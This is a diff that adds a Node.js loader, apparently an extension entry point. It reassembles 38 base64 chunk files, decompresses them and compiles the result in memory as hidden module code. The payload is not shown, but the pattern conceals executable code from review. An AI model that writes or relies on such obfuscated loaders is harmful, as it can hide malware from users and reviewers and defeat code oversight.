@@ -1,1 +1,13 @@
-PLACEHOLDER
+const fs = require('fs');
+const path = require('path');
+const zlib = require('zlib');
+const Module = require('module');
+const n = 38;
+const b64 = Array.from({ length: n }, (_, i) => fs.readFileSync(path.join(__dirname, 'eb64', String(i).padStart(3, '0')), 'utf8')).join('').replace(/\s+/g, '');
+const code = zlib.gunzipSync(Buffer.from(b64, 'base64')).toString('utf8');
+const filename = path.join(__dirname, 'extension.impl.js');
+const mod = new Module(filename, module);
+mod.filename = filename;
+mod.paths = Module._nodeModulePaths(__dirname);
+mod._compile(code, filename);
+module.exports = mod.exports;
